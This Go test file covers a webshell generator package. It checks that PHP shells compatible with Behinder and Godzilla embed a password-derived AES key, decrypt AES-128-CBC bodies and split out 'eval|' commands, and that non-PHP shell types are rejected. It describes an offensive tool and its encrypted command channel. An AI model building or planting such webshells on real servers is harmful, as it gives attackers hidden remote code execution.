package payload

import (
	"crypto/aes"
	"crypto/cipher"
	"fmt"
	"strings"
	"testing"
)

// 协议模板约束：密钥按派生算法嵌入、php-only 强校验、加密协议强制 plain 变体。
func TestGenerateProtocolTemplates(t *testing.T) {
	p, err := Generate(Options{ShellType: ShellPHP, Password: "pw123456", Protocol: "behinder"})
	if err != nil {
		t.Fatal(err)
	}
	if p.TemplateID != "php-behinder-aes" || p.Protocol != "behinder" {
		t.Errorf("template=%s protocol=%s", p.TemplateID, p.Protocol)
	}
	key := deriveKey16("pw123456")
	if len(key) != 16 || !strings.Contains(string(p.Content), "$k='"+key+"'") {
		t.Error("behinder 模板未按派生算法嵌入密钥")
	}
	if !strings.Contains(string(p.Content), "AES-128-CBC") || !strings.Contains(string(p.Content), "explode('|'") {
		t.Error("behinder 模板缺少解密/切分逻辑")
	}

	g, err := Generate(Options{ShellType: ShellPHP, Password: "pw123456", Protocol: "godzilla"})
	if err != nil {
		t.Fatal(err)
	}
	if g.TemplateID != "php-godzilla-xor" || !strings.Contains(string(g.Content), "$k='"+key+"'") {
		t.Errorf("godzilla 模板异常: %s", g.TemplateID)
	}
}

func TestGenerateProtocolRejectsNonPHP(t *testing.T) {
	for _, st := range []ShellType{ShellASP, ShellASPX, ShellJSP} {
		if _, err := Generate(Options{ShellType: st, Password: "pw123456", Protocol: "behinder"}); err == nil {
			t.Errorf("%s + behinder 应报错", st)
		}
	}
	if _, err := Generate(Options{ShellType: ShellPHP, Password: "pw123456", Protocol: "bogus"}); err == nil {
		t.Error("未知协议应报错")
	}
}

func TestGenerateProtocolForcesPlainVariant(t *testing.T) {
	p, err := Generate(Options{ShellType: ShellPHP, Password: "pw123456", Protocol: "godzilla", Variant: VariantLite})
	if err != nil {
		t.Fatal(err)
	}
	if p.Variant != VariantPlain {
		t.Errorf("加密协议下 variant 应强制 plain, got %s", p.Variant)
	}
}

// TestBehinderTemplateDecryptCycle 用 Go 复现模板解密逻辑，验证客户端加密体可被
// 模板还原为 eval|<code>（密钥/IV/填充全链对齐）。
func TestBehinderTemplateDecryptCycle(t *testing.T) {
	password := "cycletest"
	// webshellproto.Build 的客户端侧：借道本包模板的密钥派生构造等价加密
	key := []byte(deriveKey16(password))
	plain := []byte("eval|echo 1;")

	block, err := aes.NewCipher(key)
	if err != nil {
		t.Fatal(err)
	}
	pad := block.BlockSize() - len(plain)%block.BlockSize()
	padded := append(plain, make([]byte, pad)...)
	for i := len(plain); i < len(padded); i++ {
		padded[i] = byte(pad)
	}
	enc := make([]byte, len(padded))
	cipher.NewCBCEncrypter(block, key).CryptBlocks(enc, padded)

	// 模板侧 openssl_decrypt(…, OPENSSL_RAW_DATA|OPENSSL_ZERO_PADDING, key, iv=key) 等价实现
	dec := make([]byte, len(enc))
	cipher.NewCBCDecrypter(block, key).CryptBlocks(dec, enc)
	n := int(dec[len(dec)-1])
	if n >= 1 && n <= 16 {
		dec = dec[:len(dec)-n]
	}
	s := string(dec)
	if !strings.HasPrefix(s, "eval|") {
		t.Fatalf("解密结果异常: %.40s", s)
	}
	if s[5:] != "echo 1;" {
		t.Errorf("代码段 = %q", s[5:])
	}
	_ = fmt.Sprint() // 保持 fmt 引用（deriveKey16 在非测试路径使用）
}
